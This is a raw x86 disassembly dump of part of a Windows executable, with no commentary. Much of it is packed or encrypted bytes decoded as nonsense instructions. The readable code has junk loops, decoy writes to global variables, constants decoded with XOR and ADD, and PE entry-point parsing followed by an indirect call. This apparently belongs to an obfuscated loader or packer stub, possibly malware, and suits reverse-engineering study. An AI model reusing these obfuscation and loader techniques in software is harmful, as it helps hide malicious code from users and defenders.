  406115:	bound  eax,QWORD PTR [eax+0x4d]
  406118:	lahf   
  406119:	in     al,dx
  40611a:	add    eax,0x2e4933ca
  40611f:	test   eax,0xc5359ed3
  406124:	xchg   ebx,eax
  406125:	jecxz  0x40614b
  406127:	repnz lahf 
  406129:	call   0xd04a7726
  40612e:	retf   
  40612f:	out    0xdc,eax
  406131:	call   0x113b24b8
  406136:	mov    dl,0x88
  406138:	mov    DWORD PTR [esi],edi
  40613a:	sbb    DWORD PTR [ebx+eax*8+0x436c0256],0x33
  406142:	sub    bh,BYTE PTR [esi+0x1cf5f2b6]
  406148:	push   ds
  406149:	aas    
  40614a:	sub    eax,0x8d0fa1ca
  40614f:	jns    0x40610f
  406151:	dec    eax
  406152:	imul   esi,DWORD PTR [ecx],0xffffffe1
  406155:	aaa    
  406156:	out    dx,al
  406157:	and    al,bl
  406159:	fsubrp st(5),st
  40615b:	fisub  WORD PTR [ebp+edi*2+0x20b8b4e5]
  406162:	fstp   QWORD PTR ds:0x856498a2
  406168:	jo     0x406164
  40616a:	pusha  
  40616b:	or     al,0xba
  40616d:	scas   al,BYTE PTR es:[edi]
  40616e:	mov    esi,0x6647e76a
  406173:	sbb    eax,0xabf31a64
  406178:	out    0x1b,al
  40617a:	int    0x28
  40617c:	shl    BYTE PTR [eax],0x53
  40617f:	dec    ebx
  406180:	push   esi
  406181:	arpl   ax,bp
  406183:	xchg   esi,eax
  406184:	cli    
  406185:	fsubr  st(3),st
  406187:	js     0x406196
  406189:	xor    DWORD PTR [esi+ecx*1],edi
  40618c:	jg     0x4061f8
  40618e:	mov    ch,0xc
  406190:	int    0xa1
  406192:	in     al,dx
  406193:	lahf   
  406194:	fstp   TBYTE PTR [ebx-0x7b78988a]
  40619a:	xor    bl,BYTE PTR [ebx]
  40619c:	and    al,0xf3
  40619e:	push   ds
  40619f:	xor    al,0xf7
  4061a1:	dec    ebp
  4061a2:	test   eax,0x995cb088
  4061a7:	jp     0x40621f
  4061a9:	xor    BYTE PTR [ebx-0x4f281021],bh
  4061af:	inc    ecx
  4061b0:	stos   DWORD PTR es:[edi],eax
  4061b1:	mov    eax,ds:0x3762222c
  4061b6:	jno    0x406218
  4061b8:	sub    ebp,ebx
  4061ba:	mov    ebx,0xf2e52d07
  4061bf:	pop    eax
  4061c0:	and    DWORD PTR [ecx-0x18],0xd2add671
  4061c7:	and    bl,BYTE PTR [ebp+0x55]
  4061ca:	adc    DWORD PTR [ebp-0x22],0x71a2c6a5
  4061d1:	arpl   WORD PTR [edx-0x441619fd],bp
  4061d7:	inc    ebx
  4061d8:	arpl   WORD PTR [edx-0x73f38cea],di
  4061de:	dec    ecx
  4061df:	lahf   
  4061e0:	mov    ds:0x41a0f7b3,al
  4061e5:	cmp    eax,0x8c8b9910
  4061ea:	mov    al,ds:0x22469a6a
  4061ef:	cmp    eax,0x5abffa0a
  4061f4:	imul   esi,DWORD PTR [edx+0x1712e378],0x774a45f8
  4061fe:	pop    esi
  4061ff:	xor    DWORD PTR [ebp+edi*8-0x18],eax
  406203:	mov    ebx,0x2af074d8
  406208:	(bad)  
  406209:	out    dx,eax
  40620a:	inc    eax
  40620b:	pop    ss
  40620c:	dec    ebx
  40620d:	mov    dh,0x12
  40620f:	leave  
  406210:	xchg   ebx,eax
  406211:	fwait
  406212:	and    edi,esi
  406214:	jp     0x40624d
  406216:	aam    0x5f
  406218:	test   BYTE PTR ds:0x1e9d6b9f,0xdc
  40621f:	push   es
  406220:	in     al,dx
  406221:	cli    
  406222:	jl     0x406223
  406224:	jns    0x406215
  406226:	pop    ss
  406227:	shl    DWORD PTR [eax],cl
  406229:	cmc    
  40622a:	jmp    0x47c4:0x8c512e48
  406231:	ret    
  406232:	mov    edi,0x493fb73d
  406237:	xor    ch,bl
  406239:	or     al,0xa3
  40623b:	sldt   WORD PTR [edx-0x2]
  40623f:	adc    eax,edi
  406241:	repnz rcr BYTE PTR [ecx-0x8],1
  406245:	jge    0x40622f
  406247:	mov    ch,BYTE PTR [ebx+edi*4]
  40624a:	cmp    DWORD PTR [ebx-0x2d],esi
  40624d:	inc    eax
  40624e:	push   esp
  40624f:	rol    bl,1
  406251:	sub    ch,0x68
  406254:	retf   0xf3e5
  406257:	xor    BYTE PTR [ecx-0x733fa914],0x30
  40625e:	sbb    edx,DWORD PTR [edi]
  406260:	sahf   
  406261:	fs xor eax,esp
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	and    DWORD PTR [ebp+0x41],ecx
  406314:	mov    ss,WORD PTR [edi+edi*1+0x7e]
  406318:	jle    0x406346
  40631a:	jge    0x40639a
  40631c:	jle    0x406303
  40631e:	into   
  40631f:	mov    gs,WORD PTR [eax+0x5818a5fa]
  406325:	cmp    eax,0x4636b920
  40632a:	in     al,0x2f
  40632c:	xchg   ebp,eax
  40632d:	sbb    BYTE PTR es:[ecx],dl
  406330:	clc    
  406331:	lods   eax,DWORD PTR ds:[esi]
  406332:	sbb    eax,0x748e34d8
  406337:	pop    esp
  406338:	in     al,0xe4
  40633a:	add    al,0xa2
  40633c:	aad    0x5a
  40633e:	jg     0x4063aa
  406340:	xor    BYTE PTR [edi],dl
  406342:	inc    esp
  406343:	mov    dh,0x7b
  406345:	add    edx,DWORD PTR [edx-0x3f5b8925]
  40634b:	(bad)
  40634e:	xor    al,0x1b
  406350:	stos   DWORD PTR es:[edi],eax
  406351:	and    DWORD PTR [edi-0x3714c138],0x62b3c9fb
  40635b:	or     eax,0x34648d9d
  406360:	out    0x3b,eax
  406362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406363:	jle    0x4062fe
  406365:	mov    bh,0xd5
  406367:	or     ebp,ebx
  406369:	cmc    
  40636a:	push   edx
  40636b:	nop
  40636c:	rcl    DWORD PTR [eax+0x5ea51cb7],1
  406372:	das    
  406373:	daa    
  406374:	cmp    DWORD PTR [eax],ecx
  406376:	adc    ecx,DWORD PTR [esp+edx*4]
  406379:	push   esi
  40637a:	xor    edx,esi
  40637c:	clc    
  40637d:	mov    cl,0x74
  40637f:	stos   DWORD PTR es:[edi],eax
  406380:	mov    WORD PTR ds:0xc8720ca3,cs
  406386:	and    ebx,DWORD PTR ds:0x9693ad68
  40638c:	mov    bh,0xdc
  40638e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40638f:	push   cs
  406390:	push   eax
  406391:	dec    edi
  406392:	sub    bh,ch
  406394:	add    DWORD PTR [edx],0x35e0dcef
  40639a:	push   esp
  40639b:	or     al,0x50
  40639d:	mov    edi,0x24779a00
  4063a2:	dec    ebp
  4063a3:	inc    ebx
  4063a4:	mov    dl,0xbb
  4063a6:	push   eax
  4063a7:	xchg   edi,eax
  4063a8:	pop    edi
  4063a9:	dec    ecx
  4063aa:	int3   
  4063ab:	popa   
  4063ac:	stc    
  4063ad:	mov    ds:0x75617d03,eax
  4063b2:	out    0xeb,al
  4063b4:	jns    0x4063a2
  4063b6:	pop    ecx
  4063b7:	mov    eax,ds:0x1522c648
  4063bc:	std    
  4063bd:	adc    al,0x6c
  4063bf:	mov    ebx,0x1b94a517
  4063c4:	inc    eax
  4063c5:	mov    DWORD PTR [ebp+eax*1+0x7d],ebp
  4063c9:	cmp    bh,cl
  4063cb:	ins    DWORD PTR es:[edi],dx
  4063cc:	cwde   
  4063cd:	inc    esp
  4063ce:	add    BYTE PTR [eax],0x9b
  4063d1:	pop    esp
  4063d2:	xor    eax,0x5a013dca
  4063d7:	out    dx,eax
  4063d8:	sbb    eax,0x5328ea96
  4063dd:	sbb    al,0x9b
  4063df:	repnz or al,0xd1
  4063e2:	mov    edx,0xf7d898a2
  4063e7:	ja     0x406399
  4063e9:	xchg   ecx,eax
  4063ea:	repnz sub al,BYTE PTR [edi-0x3d]
  4063ee:	in     al,0xac
  4063f0:	stos   DWORD PTR es:[edi],eax
  4063f1:	loop   0x406415
  4063f3:	std    
  4063f4:	cs out 0xbf,eax
  4063f7:	xchg   ebp,eax
  4063f8:	(bad)  
  4063f9:	xchg   esi,eax
  4063fa:	xor    al,0x5f
  4063fc:	ss cdq 
  4063fe:	hlt    
  4063ff:	add    BYTE PTR [eax+eiz*4-0x4f],cl
  406403:	(bad)  
  406404:	jmp    0xa5be827e
  406409:	pop    edx
  40640a:	test   DWORD PTR [edx-0x48],ebp
  40640d:	scas   eax,DWORD PTR es:[edi]
  40640e:	and    ebp,DWORD PTR [ecx]
  406410:	in     eax,dx
  406411:	fwait
  406412:	lods   al,BYTE PTR ds:[esi]
  406413:	pop    es
  406414:	or     dl,BYTE PTR [edx+0x74]
  406417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406418:	pop    eax
  406419:	xor    bl,BYTE PTR [edx+0x10]
  40641c:	jne    0x406423
  40641e:	loop   0x40647c
  406420:	mov    dh,0x67
  406422:	fldl2t 
  406424:	pusha  
  406425:	test   DWORD PTR [eax-0xd],edx
  406428:	sbb    eax,0xfb74579d
  40642d:	call   0xfaf56927
  406432:	(bad)  
  406433:	pop    ebx
  406434:	add    esi,DWORD PTR [ecx]
  406436:	fbld   TBYTE PTR [eax]
  406438:	es push eax
  40643a:	les    ebx,FWORD PTR [edi+0x5]
  40643d:	out    dx,al
  40643e:	xchg   ebx,eax
  40643f:	xchg   ebx,eax
  406440:	shl    DWORD PTR [ecx+0x14],cl
  406443:	inc    edi
  406444:	test   DWORD PTR [ecx+0x5f],0xdece7da4
  40644b:	pavgb  mm7,mm1
  40644e:	fs dec eax
  406450:	jmp    0x3234:0x42d0b318
  406457:	gs scas eax,DWORD PTR es:[edi]
  406459:	pop    es
  40645a:	lock lahf 
  40645c:	dec    edx
  40645d:	mov    ah,0xb9
  40645f:	xchg   DWORD PTR [eax-0x5],esi
  406462:	jp     0x4064ac
  406464:	sbb    BYTE PTR [esi-0x44],dl
  406467:	push   es
  406468:	or     eax,0x601dddf5
  40646d:	shl    DWORD PTR [ecx-0x6b],cl
  406470:	mov    BYTE PTR [ebx-0x37],cl
  406473:	xor    BYTE PTR [edi+0x6e],0x2d
  406477:	push   0x7d
  406479:	adc    al,0xa9
  40647b:	(bad)  
  40647d:	and    edx,DWORD PTR [edx]
  40647f:	xchg   edi,eax
  406480:	xchg   edi,eax
  406481:	mov    DWORD PTR [ebx+ebp*8+0x3e460e89],eax
  406488:	pushf  
  406489:	xchg   esi,eax
  40648a:	push   edi
  40648b:	mov    eax,0x63aa18e8
  406490:	mov    esi,0x94cb09e3
  406495:	xchg   DWORD PTR [eax],edi
  406497:	cmp    al,0x25
  406499:	and    ah,BYTE PTR [ecx]
  40649b:	dec    esi
  40649c:	pop    ebx
  40649d:	daa    
  40649e:	(bad)  
  40649f:	jne    0x4064b1
  4064a1:	push   0x23
  4064a3:	ss sbb edi,edx
  4064a6:	pop    eax
  4064a7:	in     al,0x33
  4064a9:	mov    DWORD PTR [ebx+0x77],ebp
  4064ac:	push   ebp
  4064ad:	daa    
  4064ae:	push   ss
  4064af:	ins    DWORD PTR es:[edi],dx
  4064b0:	and    DWORD PTR [ecx+eiz*2-0x28238400],edi
  4064b7:	inc    ebx
  4064b8:	mov    ah,0xce
  4064ba:	push   edx
  4064bb:	(bad)  
  4064bc:	and    eax,0xd02b4e8f
  4064c1:	mov    gs,WORD PTR [ebp+edi*2-0x6747eb1d]
  4064c8:	mov    esp,0x433227d0
  4064cd:	int3   
  4064ce:	sar    DWORD PTR [ebx-0x25],0xc0
  4064d2:	das    
  4064d3:	shr    DWORD PTR [esi-0x26],0xf9
  4064d7:	push   esi
  4064d8:	mov    ds:0xf55a123d,eax
  4064dd:	jmp    0x4d0f:0xfa984721
  4064e4:	in     al,0xd7
  4064e6:	cmp    al,0x73
  4064e8:	fild   WORD PTR [esi+0x566a85eb]
  4064ee:	mov    eax,ds:0x5713e80
  4064f3:	ss gs mov ecx,0x6944edb2
  4064fa:	add    al,0xb7
  4064fc:	cdq    
  4064fd:	mov    dh,0xf9
  4064ff:	imul   ebp,esp,0xffffff80
  406502:	sub    eax,DWORD PTR [eax-0x20]
  406505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406506:	popa   
  406507:	rcl    DWORD PTR [ecx+0x6cc927d6],cl
  40650d:	sbb    BYTE PTR [eax],cl
  40650f:	jnp    0x4064b4
  406511:	sub    DWORD PTR [ebx-0x42],ebx
  406514:	pop    ebp
  406515:	data16 mov ch,0x10
  406518:	pop    ebp
  406519:	sahf   
  40651a:	add    DWORD PTR [edx],ebp
  40651c:	out    dx,al
  40651d:	push   ebx
  40651e:	mov    edx,0xdb73ecef
  406523:	jb     0x406589
  406525:	push   esi
  406526:	or     DWORD PTR [edi+0x3b],esp
  406529:	jae    0x4064bb
  40652b:	aad    0x6c
  40652d:	stc    
  40652e:	fisub  DWORD PTR [edi-0x1b]
  406531:	xchg   BYTE PTR [ecx],dl
  406533:	in     eax,0x26
  406535:	(bad)  
  406536:	out    0x29,eax
  406538:	pushf  
  406539:	or     dh,ch
  40653b:	mov    eax,0x7cd481c3
  406540:	mov    ebp,0x768d8a7b
  406545:	test   eax,0x4f33e6
  40654a:	xchg   ebp,eax
  40654b:	pop    esp
  40654c:	mov    al,0x49
  40654e:	dec    esp
  40654f:	fiadd  DWORD PTR [esi]
  406551:	and    cl,BYTE PTR [edi]
  406553:	dec    eax
  406554:	add    eax,0xfdc5c354
  406559:	xchg   esp,eax
  40655a:	push   esi
  40655b:	push   eax
  40655c:	sbb    cl,al
  40655e:	jle    0x406592
  406560:	mov    al,ds:0x61ed7e3f
  406565:	cmp    BYTE PTR [ebx-0x30],0x36
  406569:	lock add eax,0x7f3d8105
  40656f:	inc    ebx
  406570:	cmp    BYTE PTR [edi],al
  406572:	in     al,dx
  406573:	push   0x6e8524d
  406578:	xor    eax,0x7cc0d225
  40657d:	push   es
  40657e:	mov    dh,0x9a
  406580:	adc    ch,bh
  406582:	(bad)  
  406583:	fstp   TBYTE PTR [esi]
  406585:	out    0xa4,al
  406587:	add    dh,BYTE PTR [ecx+0x59da28d4]
  40658d:	in     al,dx
  40658e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40658f:	(bad)  
  406590:	call   0x32d3edaf
  406595:	add    DWORD PTR [esi+0x1e],esi
  406598:	mov    dh,0x19
  40659a:	mov    ds:0xfc86c2b7,al
  40659f:	jge    0x4065d2
  4065a1:	add    DWORD PTR [ebx],eax
  4065a3:	fnstsw WORD PTR [edi+0x305c93b4]
  4065a9:	adc    esp,DWORD PTR [edi+ecx*1+0xc5e549d]
  4065b0:	in     eax,0x21
  4065b2:	push   es
  4065b3:	or     edi,edx
  4065b5:	dec    esi
  4065b6:	cs push ebp
  4065b8:	mov    ah,BYTE PTR ds:0xdab42f44
  4065be:	loope  0x4065ed
  4065c0:	dec    edx
  4065c1:	shl    BYTE PTR [ecx-0x6647877a],0xc6
  4065c8:	sub    eax,0x10c4c20
  4065cd:	retf   
  4065ce:	mov    ebx,0xc891ec9d
  4065d3:	or     DWORD PTR [ebx-0x3f],edx
  4065d6:	nop
  4065d7:	pop    ds
  4065d8:	add    DWORD PTR [edx+0x5d],esi
  4065db:	leave  
  4065dc:	in     al,dx
  4065dd:	mov    DWORD PTR [ebx-0xa],edi
  4065e0:	and    al,0xbc
  4065e2:	popf   
  4065e3:	mov    eax,0x99f4009e
  4065e8:	pop    eax
  4065e9:	or     dl,BYTE PTR [edx]
  4065eb:	cmp    DWORD PTR [ebx],ebp
  4065ed:	add    bl,dh
  4065ef:	ins    BYTE PTR es:[edi],dx
  4065f0:	xchg   ecx,eax
  4065f1:	cli    
  4065f2:	inc    esi
  4065f3:	jl     0x406623
  4065f5:	aam    0x53
  4065f7:	ret    0xbe2c
  4065fa:	mov    BYTE PTR [edx-0xa29a13e],bl
  406600:	and    cl,BYTE PTR [ecx+0x31c17cb]
  406606:	mov    ch,dl
  406608:	sub    dh,BYTE PTR [edi-0x4b]
  40660b:	xchg   ebx,eax
  40660c:	stos   DWORD PTR es:[edi],eax
  40660d:	dec    ebx
  40660e:	(bad)  
  406610:	xchg   esp,eax
  406611:	stos   BYTE PTR es:[edi],al
  406612:	or     esp,DWORD PTR [eax-0x2b]
  406615:	and    DWORD PTR [esi],ebx
  406617:	(bad)  
  406618:	cmp    eax,0x82bfc69e
  40661d:	cdq    
  40661e:	clc    
  40661f:	ret    0x7eb
  406622:	cli    
  406623:	sahf   
  406624:	xor    al,0xda
  406626:	dec    esp
  406627:	stos   DWORD PTR es:[edi],eax
  406628:	jg     0x4065c9
  40662a:	or     DWORD PTR [ebp+0xd3b9ac4],0x89d97683
  406634:	sub    al,bh
  406636:	inc    edx
  406637:	sub    eax,0x7b88b1
  40663c:	pop    DWORD PTR [ebx-0x2848e41c]
  406642:	inc    ebx
  406643:	adc    esp,ebx
  406645:	ror    BYTE PTR [eax],cl
  406647:	dec    esi
  406648:	ins    DWORD PTR es:[edi],dx
  406649:	jp     0x4065d2
  40664b:	mov    ss,ecx
  40664d:	pushf  
  40664e:	out    dx,al
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
